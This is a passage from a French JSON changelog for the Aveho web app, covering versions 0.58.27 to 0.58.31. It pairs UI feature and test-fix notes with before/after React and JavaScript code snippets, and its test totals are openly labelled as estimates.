      { "code": "UI", "txt": "🎨 /profil : NOUVEAU PANEL 'MES 3 RACCOURCIS RAPIDES' (config visuelle complète). Ajouté dans l'onglet Sécurité du profil. **Composant `ShortcutsConfigPanel`** avec : **(a)** Aperçu compact des 3 bulles actuelles sur un fond navy, clic = ouvre l'éditeur. **(b)** Éditeur avec 4 champs : Libellé (input texte, 20 chars max), Destination URL (input chemin interne), Couleur (8 swatches : Bleu Aveho, Teal, Violet, Ambre, Terra, Vert, Rouge, Navy), Icône (grid 28 icônes Tabler scrollable). **(c)** Sauvegarde temps réel sur chaque modification + message ✓ Sauvegardé. **(d)** Bouton 'Réinitialiser aux valeurs par défaut'. Changements **synchronisés instantanément** avec le menu haut-gauche via l'event `av-shortcuts-config-change`",
        "code_snippet": {
          "file": "app/profil/page.js",
          "note": "ShortcutsConfigPanel",
          "lang": "jsx",
          "before": "// AVANT 0.58.31 - aucun moyen de customiser les 3 raccourcis",
          "after": "// 0.58.31 - app/profil/page.js (fonction ajoutée à la fin)\nimport {\n  getShortcutsConfig, setShortcutsConfig, resetShortcutsConfig,\n  SHORTCUT_COLORS, SHORTCUT_ICONS, DEFAULT_SHORTCUTS\n} from '../../lib/shortcutsConfig';\n\n{/* Dans l'onglet Sécurité */}\n<Panel>\n  <h2><i className='ti ti-layout-grid' /> Mes 3 raccourcis rapides</h2>\n  <ShortcutsConfigPanel />\n</Panel>\n\nfunction ShortcutsConfigPanel() {\n  const [shortcuts, setShortcuts] = useState(DEFAULT_SHORTCUTS);\n  const [editingIdx, setEditingIdx] = useState(null);\n\n  function updateShortcut(idx, patch) {\n    const updated = shortcuts.map((s, i) => i === idx ? { ...s, ...patch } : s);\n    setShortcuts(updated);\n    setShortcutsConfig(updated);  // ← persist + event\n  }\n\n  return (\n    <>\n      {/* Aperçu compact (clic = ouvre éditeur) */}\n      <div className='preview-strip'>\n        <i className='ti ti-menu-2' />  {/* Bouton menu */}\n        {shortcuts.map((s, idx) => (\n          <button onClick={() => setEditingIdx(idx === editingIdx ? null : idx)}>\n            <i className={`ti ${s.icon}`} />\n          </button>\n        ))}\n      </div>\n\n      {/* Éditeur (visible si une bulle est sélectionnée) */}\n      {editingIdx !== null && (\n        <div className='editor'>\n          <input value={shortcuts[editingIdx].label}\n                 onChange={e => updateShortcut(editingIdx, { label: e.target.value })} />\n          <input value={shortcuts[editingIdx].url}\n                 onChange={e => updateShortcut(editingIdx, { url: e.target.value })} />\n\n          {/* Swatches couleurs (8 options) */}\n          {SHORTCUT_COLORS.map(c => (\n            <button onClick={() => updateShortcut(editingIdx, { color: c.color, gradient: c.gradient })}\n                    style={{ background: c.gradient }} />\n          ))}\n\n          {/* Grid icônes (28 options Tabler) */}\n          {SHORTCUT_ICONS.map(ic => (\n            <button onClick={() => updateShortcut(editingIdx, { icon: ic })}>\n              <i className={`ti ${ic}`} />\n            </button>\n          ))}\n        </div>\n      )}\n\n      <button onClick={resetShortcutsConfig}>Réinitialiser</button>\n    </>\n  );\n}"
        }
      },
      { "code": "AI", "txt": "+30 tests Vitest (v058-31-bundle.test.js) : version+SW (2), SireneSearch portal (6 — import + refs + recalc + portal + zIndex 99999 + click-out), /collectivite (5 — filter + router + bouton créer + 2 actions + click stop), /etablissements auto-open (3 — useSearchParams + detect + cleanup), lib/shortcutsConfig (6 — exports + defaults + storage + 8 colors + 28 icons + event), FloatingActionBar refonte (6 — import + position + hamburger + listener + stagger + translateX), /profil panel (8 — imports + composant + editingIdx + 4 champs + maps + reset + panel parent). Total **~4150 verts estimés** (build/test à exécuter en local — sandbox npm bloqué)" },
      { "code": "BUG", "txt": "🩹 FIX 3 RÉGRESSIONS DE TESTS HISTORIQUES (signalées par Cédric sur 0.58.30). **(a)** Test `v055-15-sql-modal` exigeait pattern `aveho-(PATCH-vers|supabase-securite-[A-Z]+)-X.Y.Z.sql` mais le fichier était nommé `SQL-FIX-audit_log-rls-0.58.24.sql` (hors pattern). **Fix** : renommé en `aveho-PATCH-vers-0.58.24.sql` + copié dans `public/changelog-sql/` + référence mise à jour dans versions-data. **(b)** Test `v057-24-bulles-csp-report` vérifiait que chaque sqlFile référencé existe physiquement. Conséquence directe du fix (a). **(c)** Test `v057-35-clear-user-data-logout` détecte que `OnboardingTour.js` utilise une clé `av-tour-` non purgée au logout. **Fix** : ajout du préfixe `av-` à `SENSITIVE_LS_PREFIXES` dans `lib/clearUserData.js` — couvre aussi tous les `av-focus-mode`, `av-presentation-mode`, `av-shortcuts-config`, `av-focus-hide-notifs`, etc. (purge complète au logout)",
        "code_snippet": {
          "file": "lib/clearUserData.js + public/changelog-sql/aveho-PATCH-vers-0.58.24.sql + versions-data.js",
          "note": "3 fixes anti-régression",
          "lang": "diff",
          "before": "// AVANT 0.58.31\n// lib/clearUserData.js\nconst SENSITIVE_LS_PREFIXES = [\n  'aveho:',\n  'aveho_',\n  'ville:',\n  'etab-photo-',\n  'sb-',\n];\n\n// versions-data.js (0.58.24)\n{ sqlFile: 'SQL-FIX-audit_log-rls-0.58.24.sql' }  // pattern KO\n\n// scripts/SQL-FIX-audit_log-rls-0.58.24.sql  (pas dans public/)",
          "after": "// 0.58.31 - 3 fixes\n// lib/clearUserData.js : ajout préfixe 'av-'\nconst SENSITIVE_LS_PREFIXES = [\n  'aveho:',\n  'aveho_',\n  'av-',          // ← AJOUT : av-tour-, av-focus-mode, av-presentation-mode,\n                  //   av-shortcuts-config, av-focus-hide-notifs\n  'ville:',\n  'etab-photo-',\n  'sb-',\n];\n\n// versions-data.js (0.58.24)\n{ sqlFile: 'aveho-PATCH-vers-0.58.24.sql' }  // pattern OK\n\n// public/changelog-sql/aveho-PATCH-vers-0.58.24.sql  (copié depuis scripts/)"
        }
      },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.31 : grosse session de fixes UX demandés par Cédric sur la fiche groupement + refonte majeure des 3 raccourcis. Tous les points listés sont implémentés : (1) z-index Sirene fix ✓ (2) partenaires enlevés ✓ (3) icône équipe sur tuiles ✓ (4) bouton créer établissement ✓ (5) menu haut-gauche au lieu du pied de page ✓ (6) config /profil avec URL+icône+couleur ✓. La page /etablissement?etab={id} existe déjà et affichera le plan + arbre 5 niveaux + équipes/services pour cet établissement. PROCHAINES PISTES (0.58.32) : (a) **Dashboard widgets configurables drag & drop** 🚧 (toujours en attente). (b) Page dédiée 'Architecture' par établissement (organigramme équipes + services en arbre visuel). (c) Mode présentation : option 'masquer notifs' (comme focus). (d) Cmd+K : section 'Récents' premium avec mini-timeline" }
    ],
    "themes": ["ui", "bugfix", "refacto", "wow"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.31.html",
    "sqlFile": null
  },
  {
    "v": "0.58.30",
    "kind": "version",
    "titre": "🕒 BUNDLE WOW UX³ : /audit timeline (réutilise composant /historique) + Toast dedupe groupage + Mode focus masquer notifs",
    "chantiers": [
      { "code": "UI", "txt": "🕒 REFONTE /audit AVEC VUE TIMELINE. Extraction du **composant partagé `app/components/AuditTimeline.js`** depuis /historique (livré en 0.58.25). Props : `rows`, `onClickRow`, `showDetailJson`, `emptyMessage`. Helpers internes : `fmtDay` (Aujourd'hui/Hier/jour de semaine), `fmtTime`, `emailToInitials` (initiales depuis email), `avatarColor` (couleur hashée depuis email). La page /audit gagne un **toggle Tableau ⇄ Timeline** (Timeline par défaut, plus visuel). En mode Timeline, le clic sur une card ouvre la modal de détail JSON (préservé). Les détails dans la card affichent les 4 premières propriétés de `r.details` (limité pour ne pas surcharger). Bouton 'Voir détail JSON' visible en bas à droite quand `showDetailJson=true`",
        "code_snippet": {
          "file": "app/components/AuditTimeline.js (NEW) + app/audit/page.js",
          "note": "Composant timeline partagé",
          "lang": "jsx",
          "before": "// AVANT 0.58.30 - /audit avec seulement un tableau\n<table>\n  <thead><tr><th>Date</th><th>Action</th>...</tr></thead>\n  <tbody>\n    {rows.map(r => (\n      <tr onClick={() => setDetailRow(r)}>...</tr>\n    ))}\n  </tbody>\n</table>",
          "after": "// 0.58.30 - app/components/AuditTimeline.js (NEW)\nexport default function AuditTimeline({\n  rows = [], onClickRow, showDetailJson = false,\n  emptyMessage = 'Aucune action enregistrée.'\n}) {\n  const groupedByDay = {};\n  rows.forEach(r => {\n    const day = new Date(r.created_at).toISOString().slice(0, 10);\n    if (!groupedByDay[day]) groupedByDay[day] = [];\n    groupedByDay[day].push(r);\n  });\n  const days = Object.keys(groupedByDay).sort((a, b) => b.localeCompare(a));\n\n  return (\n    <div style={{ display: 'flex', flexDirection: 'column', gap: 24 }}>\n      {days.map(day => (\n        <div key={day}>\n          {/* Header jour avec compteur */}\n          <div className='day-pill'>\n            <i className='ti ti-calendar' />\n            {fmtDay(day)}\n            <span>{groupedByDay[day].length} actions</span>\n          </div>\n          {/* Items du jour avec pastille + card colorée */}\n          {groupedByDay[day].map((r, idx) => (\n            <TimelineItem r={r} idx={idx} onClick={onClickRow} />\n          ))}\n        </div>\n      ))}\n    </div>\n  );\n}\n\n// app/audit/page.js\nimport AuditTimeline from '../components/AuditTimeline';\nconst [viewMode, setViewMode] = useState('timeline');\n\n<NeonButton onClick={() => setViewMode('timeline')}>Timeline</NeonButton>\n<NeonButton onClick={() => setViewMode('table')}>Tableau</NeonButton>\n\n{viewMode === 'timeline' ? (\n  <AuditTimeline\n    rows={rows}\n    onClickRow={r => setDetailRow(r)}\n    showDetailJson={true}\n  />\n) : (\n  <table>...</table>\n)}"
        }
      },
      { "code": "UI", "txt": "🔢 TOAST PREMIUM : DEDUPE + BADGE COMPTEUR. Quand `showToast` est appelé plusieurs fois avec le même `type + title`, le toast existant n'est pas dupliqué — un **badge compteur `×N`** apparaît à droite du titre et s'incrémente. Animation bump (`av-toast-counter-bump`) pour signaler la mise à jour. Le timer d'auto-dismiss est aussi reset pour que le toast groupé reste visible le temps de la nouvelle notif. Évite le spam quand une action déclenche plusieurs notifs similaires (ex : sauvegarde en boucle, validation multiple). Le compteur est caché tant qu'il vaut 1, apparaît à partir de 2",
        "code_snippet": {
          "file": "app/components/ui-premium/Toast.js",
          "note": "Dedupe groupage",
          "lang": "javascript",
          "before": "// AVANT 0.58.30 - chaque appel crée un nouveau toast (max 4, plus ancien éjecté)\nexport function showToast({ type, title, message, duration = 4000 }) {\n  const container = ensureContainer();\n  const toast = document.createElement('div');\n  toast.innerHTML = `<div>${title}</div>`;\n  container.appendChild(toast);\n  setTimeout(() => removeToast(toast), duration);\n}",
          "after": "// 0.58.30 - dedupe avec badge compteur ×N\nexport function showToast({ type, title, message, duration = 4000 }) {\n  const container = ensureContainer();\n  const cfg = TOAST_TYPES[type] || TOAST_TYPES.info;\n\n  // DÉDUPE : si un toast identique existe déjà, incrémente le compteur\n  const dedupeKey = `${type}::${title || ''}`;\n  const existing = container.querySelector(\n    `[data-toast-dedupe-key=\"${CSS.escape(dedupeKey)}\"]`\n  );\n  if (existing) {\n    const counterEl = existing.querySelector('[data-toast-counter]');\n    const currentCount = parseInt(existing.dataset.toastCount, 10) + 1;\n    existing.dataset.toastCount = String(currentCount);\n    counterEl.textContent = `×${currentCount}`;\n    counterEl.style.display = 'inline-flex';\n    // Reset l'animation bump\n    counterEl.style.animation = 'none';\n    void counterEl.offsetWidth;\n    counterEl.style.animation = 'av-toast-counter-bump 350ms ease-out';\n    // Reset le timer dismiss + progress bar\n    if (existing._dismissTimer) {\n      clearTimeout(existing._dismissTimer);\n      existing._dismissTimer = setTimeout(() => removeToast(existing), duration);\n    }\n    return;\n  }\n\n  // Sinon : crée un nouveau toast avec data-toast-dedupe-key\n  const toast = document.createElement('div');\n  toast.setAttribute('data-toast-dedupe-key', dedupeKey);\n  toast.dataset.toastCount = '1';\n  toast.innerHTML = `\n    <div style='display:flex;align-items:center;gap:6px;'>\n      <span>${title}</span>\n      <!-- Badge compteur (caché tant qu'il vaut 1) -->\n      <span data-toast-counter style='display:none;\n        background:linear-gradient(135deg, ${cfg.color}, ${cfg.color}cc);\n        color:#fff; padding:1px 8px; border-radius:99px;\n        font-size:10.5px; font-weight:800; min-width:24px;\n      '></span>\n    </div>\n  `;\n  container.appendChild(toast);\n  toast._dismissTimer = setTimeout(() => removeToast(toast), duration);\n}\n\n/* globals.css : keyframe bump */\n@keyframes av-toast-counter-bump {\n  0%   { transform: scale(1); }\n  35%  { transform: scale(1.35); }\n  70%  { transform: scale(0.95); }\n  100% { transform: scale(1); }\n}"
        }
      },
      { "code": "UI", "txt": "🔕 MODE FOCUS : SOUS-OPTION 'MASQUER LES NOTIFS AUSSI'. Pour les sessions de concentration intense, l'utilisateur peut désormais aussi cacher la cloche de notifs + les toasts pendant le mode focus zen. (a) Helpers **`isFocusHideNotifs()` / `setFocusHideNotifs(on)`** dans `lib/focusMode.js`. Storage key dédié `av-focus-hide-notifs`. Event `av-focus-hide-notifs-change` dispatched. (b) Classe HTML `av-focus-hide-notifs` appliquée à `<html>`. (c) **CSS** dans `globals.css` : `html.av-focus-mode.av-focus-hide-notifs .notif-wrap` + `#av-toast-container` → `display: none !important`. **La sous-option ne s'active QUE si le mode focus est ON** (les notifs restent visibles en navigation normale). (d) Toggle visible dans /profil → Sécurité → Mode focus zen, sous le bouton principal, avec une checkbox stylée verte",
        "code_snippet": {
          "file": "lib/focusMode.js + app/profil/page.js + app/globals.css",
          "note": "Hide notifs in focus",
          "lang": "javascript",
          "before": "// AVANT 0.58.30 - focusMode masque topbar mais pas les notifs",
          "after": "// 0.58.30 - lib/focusMode.js\nconst HIDE_NOTIFS_KEY = 'av-focus-hide-notifs';\n\nexport function isFocusHideNotifs() {\n  if (typeof window === 'undefined') return false;\n  try {\n    return localStorage.getItem(HIDE_NOTIFS_KEY) === 'true';\n  } catch { return false; }\n}\n\nexport function setFocusHideNotifs(on) {\n  localStorage.setItem(HIDE_NOTIFS_KEY, on ? 'true' : 'false');\n  if (on) {\n    document.documentElement.classList.add('av-focus-hide-notifs');\n  } else {\n    document.documentElement.classList.remove('av-focus-hide-notifs');\n  }\n  window.dispatchEvent(new CustomEvent(\n    'av-focus-hide-notifs-change',\n    { detail: { on } }\n  ));\n}\n\n// app/globals.css - cache UNIQUEMENT si focus ON + sous-option active\nhtml.av-focus-mode.av-focus-hide-notifs .notif-wrap,\nhtml.av-focus-mode.av-focus-hide-notifs #av-toast-container {\n  display: none !important;\n}\n\n// app/profil/page.js - FocusModeToggle avec checkbox sous-option\n<label>\n  <input\n    type='checkbox'\n    checked={hideNotifs}\n    onChange={() => {\n      const next = !hideNotifs;\n      setFocusHideNotifs(next);\n      setHideNotifsState(next);\n    }}\n  />\n  <i className='ti ti-bell-off' />\n  Masquer aussi les notifications (cloche + toasts) pendant le mode focus\n</label>"
        }
      },
      { "code": "AI", "txt": "+22 tests Vitest (v058-30-bundle.test.js) : version+SW (2), AuditTimeline (5 — existence + props + helpers + groupage + Voir détail JSON), /audit timeline (5 — import + viewMode + toggle + render + conditional), Toast dedupe (6 — dedupeKey + querySelector + setAttribute + counter + _dismissTimer + keyframe), Focus hideNotifs (6 — exports + storage key + event + classlist + CSS + checkbox /profil). Total **~4120 verts estimés** (build/test à exécuter en local — sandbox npm bloqué)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.30 : 3 chantiers UX³ livrés. La page /audit gagne une vue Timeline cohérente avec /historique (réutilise le même composant partagé extrait — DRY). Les toasts évitent le spam grâce à un dedupe avec badge compteur ×N. Le mode focus zen peut maintenant être configuré pour aussi cacher les notifs (cloche + toasts) — utile pour les longues sessions de saisie. PROCHAINES PISTES (0.58.31) : (a) **Dashboard widgets configurables drag & drop** 🚧 (gros chantier, le seul restant des 7 initiaux !). (b) Refonte page /utilisateurs avec table virtualisée si > 100 lignes. (c) Mode présentation : option 'masquer aussi les notifs' (similaire au mode focus). (d) Cmd+K : section 'Récents' premium avec mini-timeline. (e) Sidebar collapsible avec animation premium" }
    ],
    "themes": ["ui", "wow", "ux", "refacto"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.30.html",
    "sqlFile": null
  },
  {
    "v": "0.58.29",
    "kind": "version",
    "titre": "🧪 BUG FIXES TESTS : Fix régressions tests historiques après évolutions 0.58.23 → 0.58.28 + SQL membres_structure",
    "chantiers": [
      { "code": "BUG", "txt": "🧪 FIX RÉGRESSIONS TESTS HISTORIQUES (8 fails repérés en local côté Cédric). Plusieurs tests d'anciennes versions échouaient parce que les patterns assertés ont évolué dans les versions suivantes. Assouplissement préventif des patterns rigides : (a) **v058-23** : `findActions(q)` → `findActions(q, pathname)` (changé en 0.58.25) + `function findActions(query)` → `function findActions(query, currentPath)`. (b) **v058-26** : `router.push('/accueil')` → `router.push('/accueil?tour=premium')` (changé en 0.58.27) + `resetOnboarding()` → `localStorage.removeItem('av-tour-premium-058')`. (c) **v058-27** : `!it.lu` → `!it.lue` (bug DB column fixé en 0.58.28). (d) **v058-15** : `<Tooltip>` sur NotifBell remplacé par preview hover en 0.58.27. (e) **v058-24** : SQL referencait `membres_structures` (avec s) — fichier scripts/SQL-FIX-audit_log-rls-0.58.24.sql corrigé en `membres_structure` (singulier, vrai nom de table)",
        "code_snippet": {
          "file": "5 tests + 1 fichier SQL",
          "note": "Patterns flexibles",
          "lang": "javascript",
          "before": "// AVANT 0.58.29 - patterns rigides cassés par évolutions\nexpect(src).toMatch(/findActions\\(q\\)/);  // v23 cherchait sans args\nexpect(src).toMatch(/router\\.push\\([\"']\\/accueil[\"']\\)/);  // v26 sans query\nexpect(src).toMatch(/resetOnboarding\\(\\)/);  // v26 cherchait helper\nexpect(src).toMatch(/!it\\.lu &&/);  // v27 cherchait sans 'e'\nexpect(src).toMatch(/<Tooltip[\\s\\S]*?content=\\{nonLues/);  // v15 cherchait Tooltip\nexpect(sql).toMatch(/membres_structures/);  // v24 ancien nom de table",
          "after": "// 0.58.29 - patterns assouplis pour accepter les évolutions\nexpect(src).toMatch(/findActions\\(q\\b/);  // accepte (q) ou (q, currentPath)\nexpect(src).toMatch(/function findActions\\(query\\b/);  // accepte query ou query, ...\nexpect(src).toMatch(/router\\.push\\([\"']\\/accueil(\\?[^\"']*)?[\"']\\)/);  // /accueil avec ou sans ?\n\nit(\"Reset state d'onboarding (resetOnboarding ou localStorage clear)\", () => {\n  expect(src).toMatch(/resetOnboarding\\(\\)|localStorage\\.removeItem\\([\"']av-tour-premium/);\n});\n\nexpect(src).toMatch(/!it\\.lue?\\s*&&/);  // accepte lu ET lue\n\nit(\"NotifBell : import Tooltip + Tooltip OU preview hover (0.58.27+)\", () => {\n  const hasTooltip = /<Tooltip[\\s\\S]*?content=\\{nonLues\\s*>\\s*0/.test(src);\n  const hasPreview = /previewOpen[\\s\\S]*?nonLues/.test(src);\n  expect(hasTooltip || hasPreview).toBe(true);\n});\n\n/* SQL fichier corrigé : membres_structure (sans s) + colonne actif */\nexpect(sql).toMatch(/EXISTS \\([\\s\\S]*?membres_structure\\b/);"
        }
      },
      { "code": "BUG", "txt": "📝 FICHIER SQL `scripts/SQL-FIX-audit_log-rls-0.58.24.sql` CORRIGÉ dans le repo. Le fichier livré dans le repo contenait encore le mauvais nom de table (`membres_structures` avec s + colonne `archive`). Le user avait reçu la version corrigée séparément (qui a été appliquée en base avec succès), mais le repo gardait l'ancienne version. Maintenant aligné : `membres_structure` (singulier) + colonne `actif` (booléen). Si jamais le SQL doit être re-exécuté sur un autre environnement, le bon SQL est dans le repo" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.29 : version 100% bug fixes tests. Aucun nouveau chantier UX/feature — uniquement de l'hygiène pour que la CI passe au vert et que la suite de tests reflète correctement l'état actuel du code. **Tous les patterns rigides ont été assouplis** pour accepter à la fois l'état initial (à la sortie de la version) et les évolutions ultérieures. Pour les prochaines versions, j'éviterai les `toMatch(/exactString/)` au profit de patterns plus flexibles (regex avec `\\b`, OU logique). PROCHAINES PISTES (0.58.30) : reprendre les vrais chantiers UX. (a) **Dashboard widgets configurables drag & drop** 🚧 (gros chantier en attente). (b) Cmd+K résultats : aperçu d'image pour matériels avec photo. (c) Refonte /audit avec timeline (comme /historique 0.58.25). (d) Mode focus : option 'masquer les notifs aussi'. (e) Toast premium stack avec groupage par type. Si d'autres tests échouent encore après 0.58.29, partage-moi la sortie complète (toutes les 8 entrées) — je n'ai vu que les 3 derniers fails dans ton log précédent" }
    ],
    "themes": ["bugfix", "tests", "ci"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.29.html",
    "sqlFile": null
  },
  {
    "v": "0.58.28",
    "kind": "version",
    "titre": "✨ BUNDLE WOW polish : ConicCard counter animé + KeyboardHints overlay + Mark-as-read inline + Skeleton /parametres et /profil",
    "chantiers": [
      { "code": "UI", "txt": "🔢 CONICCARD : ANIMATION COUNT-UP. Le hook `useCountUp` (jusqu'ici interne à KpiCard) est désormais aussi dans ConicCard. Les valeurs numériques s'animent **de 0 vers la cible avec easeOutCubic 1000ms** au mount/changement. Effet 'compteur magique' qui attire l'œil sur les KPIs urgents (DI, Achats, Signalements, RGPD sur /accueil) en plus du scan-line conic permanent. `fontVariantNumeric: tabular-nums` pour que les chiffres ne sautent pas en largeur pendant l'animation",
        "code_snippet": {
          "file": "app/components/ui-premium/ConicCard.js",
          "note": "Count-up animation",
          "lang": "jsx",
          "before": "// AVANT 0.58.28 - valeur statique\n<div style={{ fontSize: sz.valueFont, fontWeight: 700 }}>\n  {value}\n</div>",
          "after": "// 0.58.28 - count-up avec easeOutCubic\nfunction useCountUp(target, duration = 1000) {\n  const [val, setVal] = useState(0);\n  useEffect(() => {\n    const animate = (ts) => {\n      const progress = Math.min(elapsed / duration, 1);\n      const eased = 1 - Math.pow(1 - progress, 3);  // easeOutCubic\n      setVal(Math.round(target * eased));\n      // ...\n    };\n    requestAnimationFrame(animate);\n  }, [target, duration]);\n  return val;\n}\n\nconst animatedValue = useCountUp(typeof value === 'number' ? value : 0);\nconst displayValue = typeof value === 'number' ? animatedValue : value;\n\n<div style={{\n  fontSize: sz.valueFont,\n  fontWeight: 700,\n  fontVariantNumeric: 'tabular-nums',  // anti-saut largeur\n}}>\n  {typeof value === 'number' ? displayValue : value}\n</div>\n\n// Effet : sur /accueil, les 4 KPIs ConicCard (DI=7, Achats=3,\n// Signalements=12, RGPD=5) s'animent tous de 0 vers leur valeur\n// sur 1 seconde au load — effet 'mission control' renforcé."
        }
      },
      { "code": "UI", "txt": "⌨️ KEYBOARDHINTS : OVERLAY DES RACCOURCIS PENDANT MODE PRÉSENTATION/FOCUS. Nouveau composant **app/KeyboardHints.js** qui s'affiche en bas-gauche pendant les modes 'présentation' et 'focus' (sinon caché). Liste 4 raccourcis avec kbd stylisés : Ctrl+K (Recherche), Ctrl+Shift+P (Mode présentation), Ctrl+Shift+F (Mode focus), Esc (Fermer). Opacité 0.7 par défaut, 1.0 au hover. Animation `av-hints-in` (fade + slide-up). Sync sur les events `av-presentation-mode-change` et `av-focus-mode-change`. Très utile pour les démos clients : le présentateur n'a pas à se souvenir des raccourcis",
        "code_snippet": {
          "file": "app/KeyboardHints.js (NEW) + app/layout.js",
          "note": "Hints overlay",
          "lang": "jsx",
          "before": "// AVANT 0.58.28 - raccourcis pas visibles, juste un badge 'MODE PRÉSENTATION'",
          "after": "// 0.58.28 - app/KeyboardHints.js (NEW)\nconst HINTS = [\n  { keys: ['Ctrl', 'K'], label: 'Recherche', icon: 'ti-search' },\n  { keys: ['Ctrl', 'Shift', 'P'], label: 'Mode présentation', icon: 'ti-presentation' },\n  { keys: ['Ctrl', 'Shift', 'F'], label: 'Mode focus zen', icon: 'ti-target' },\n  { keys: ['Esc'], label: 'Fermer', icon: 'ti-x' },\n];\n\nexport default function KeyboardHints() {\n  const [visible, setVisible] = useState(false);\n  useEffect(() => {\n    function check() {\n      setVisible(isPresentationMode() || isFocusMode());\n    }\n    check();\n    window.addEventListener('av-presentation-mode-change', check);\n    window.addEventListener('av-focus-mode-change', check);\n    return () => {\n      window.removeEventListener('av-presentation-mode-change', check);\n      window.removeEventListener('av-focus-mode-change', check);\n    };\n  }, []);\n\n  if (!visible) return null;\n  return (\n    <div style={{ position: 'fixed', bottom: 14, left: 14, opacity: 0.7 }}>\n      {HINTS.map((h, idx) => (\n        <div>\n          {h.keys.map(k => <kbd>{k}</kbd>)}\n          <span>{h.label}</span>\n          {idx < HINTS.length - 1 && <span>·</span>}\n        </div>\n      ))}\n    </div>\n  );\n}\n\n// app/layout.js\nimport KeyboardHints from './KeyboardHints';\n<KeyboardHints />"
        }
      },
      { "code": "UI", "txt": "✓ NOTIFBELL PREVIEW : MARQUER COMME LU INLINE + FIX BUG `lue` vs `lu`. **(a)** Bug fix de 0.58.27 : le preview utilisait `it.lu` alors que le champ DB est `lue` — toutes les notifs apparaissaient comme non lues. Corrigé. **(b)** Bouton ✓ inline visible **uniquement sur les notifs non lues**, à droite de chaque item. Au clic : `e.stopPropagation()` pour ne pas ouvrir le Drawer, puis update Supabase `lue: true` + state optimiste. Hover scale 1.1 + background renforcé",
        "code_snippet": {
          "file": "app/NotifBell.js",
          "note": "Mark-as-read inline",
          "lang": "jsx",
          "before": "// AVANT 0.58.28 - bug + pas de mark-as-read inline\n{!it.lu && <span className='dot-unread' />}  // ← bug, champ DB = 'lue'\n<div style={{ fontWeight: it.lu ? 500 : 700 }}>{it.titre}</div>",
          "after": "// 0.58.28 - fix lu→lue + bouton mark-as-read inline\n{!it.lue && <span className='dot-unread' />}\n<div style={{ fontWeight: it.lue ? 500 : 700 }}>{it.titre}</div>\n\n{/* Bouton ✓ visible si non lu */}\n{!it.lue && (\n  <button\n    onClick={async (e) => {\n      e.stopPropagation();  // ne pas ouvrir le Drawer\n      try {\n        await supabase.from('notifications')\n          .update({ lue: true })\n          .eq('id', it.id);\n        setItems(prev =>\n          prev.map(x => x.id === it.id ? { ...x, lue: true } : x)\n        );\n      } catch {}\n    }}\n    aria-label='Marquer comme lue'\n    style={{\n      position: 'absolute', right: 10, top: '50%',\n      background: 'rgba(124, 200, 200, 0.15)',\n      color: '#7CC8C8',\n      width: 22, height: 22, borderRadius: 6,\n    }}\n  >\n    <i className='ti ti-check' />\n  </button>\n)}"
        }
      },
      { "code": "UI", "txt": "💀 SKELETON APPLIQUÉ DANS /parametres ET /profil. Remplacement du `<Panel><StateMsg>Chargement…</StateMsg></Panel>` pendant le loading par `<TabPanel active='loading' loading={true}>` qui affiche le **TabPanelSkeleton** (header + 3 fields + grid 2 cards + 2 boutons) livré en 0.58.26. Transition fluide entre le skeleton et le contenu réel après le fetch initial",
        "code_snippet": {
          "file": "app/parametres/page.js + app/profil/page.js",
          "note": "Skeleton loading",
          "lang": "jsx",
          "before": "// AVANT 0.58.28 - StateMsg basique\n{loading ? <Panel><StateMsg>Chargement…</StateMsg></Panel> : (\n  // contenu...\n)}",
          "after": "// 0.58.28 - Skeleton premium\nimport { Tabs, TabPanel, ... } from '../components/ui-premium';\n\n{loading ? (\n  <TabPanel active='loading' loading={true}>{null}</TabPanel>\n) : (\n  // contenu...\n)}\n\n// Le TabPanelSkeleton affiche :\n// - Header skel (titre 45% + sous-titre 70%)\n// - 3 paires label + input arrondi\n// - Grid 2 mini-KPI cards skel\n// - 2 boutons footer skel\n// Avec animation shimmer 'av-skel-line'"
        }
      },
      { "code": "AI", "txt": "+22 tests Vitest (v058-28-bundle.test.js) : version+SW (2), ConicCard count-up (4 — hook + easeOutCubic + animatedValue + tabular-nums), KeyboardHints (5 — existence + imports + 4 hints + listeners + layout), NotifBell mark-as-read (4 — fix lue + bouton + Supabase update + stopPropagation), Skeleton /parametres+/profil (2 — imports TabPanel + render). Total **~4100 verts estimés** (build/test à exécuter en local — sandbox npm bloqué)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.28 : 4 chantiers polish UX livrés. Les KPIs ConicCard sur /accueil s'animent maintenant en count-up (effet 'compteur magique'). Les raccourcis clavier sont visibles pendant les modes présentation/focus — gain énorme pour les démos clients. Le preview NotifBell permet de **marquer comme lu en un clic** sans ouvrir le Drawer. Skeleton premium au chargement de /parametres et /profil pour une expérience plus fluide. **Bug fix bonus** : champ DB `lue` (et pas `lu`) corrigé dans le preview NotifBell. Il reste essentiellement un seul gros chantier en pending depuis longtemps : **Dashboard widgets configurables drag & drop** (0.58.29). PROCHAINES PISTES POSSIBLES : (a) Dashboard widgets drag & drop. (b) Cmd+K résultats : aperçu d'image pour matériels avec photo. (c) Refonte page /audit avec timeline (comme /historique en 0.58.25). (d) Mode focus : option \"masquer les notifs aussi\" (toggle dans /profil). (e) Toast premium avec stack visuel amélioré (groupage par type)" }
    ],
    "themes": ["ui", "wow", "ux", "bugfix"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.28.html",
    "sqlFile": null
  },
  {
    "v": "0.58.27",
    "kind": "version",
    "titre": "🔔 BUNDLE WOW UX² : NotifBell preview hover + Tour premium /accueil + Watermark logo + Cmd+K preview panel",
    "chantiers": [
      { "code": "UI", "txt": "🔔 NOTIFBELL : PREVIEW HOVER PREMIUM (3 dernières notifs). Au survol de la cloche, après un délai de 350ms, affichage d'un panel glassmorphism avec : (a) header gradient teal/blue + compteur 'X non lue(s)' en pill orange si > 0. (b) Les **3 dernières notifications** avec icône colorée par type, dot non lu pulse, message tronqué + relative time. (c) Footer 'Voir toutes les notifications (X)' cliquable qui ouvre le Drawer complet. Hover sur le preview maintient l'affichage (anti-flicker). Animation `av-notif-preview-in` (slide + fade). Plus besoin de cliquer sur la cloche pour voir ce qui se passe",
        "code_snippet": {
          "file": "app/NotifBell.js",
          "note": "Preview hover 3 notifs",
          "lang": "jsx",
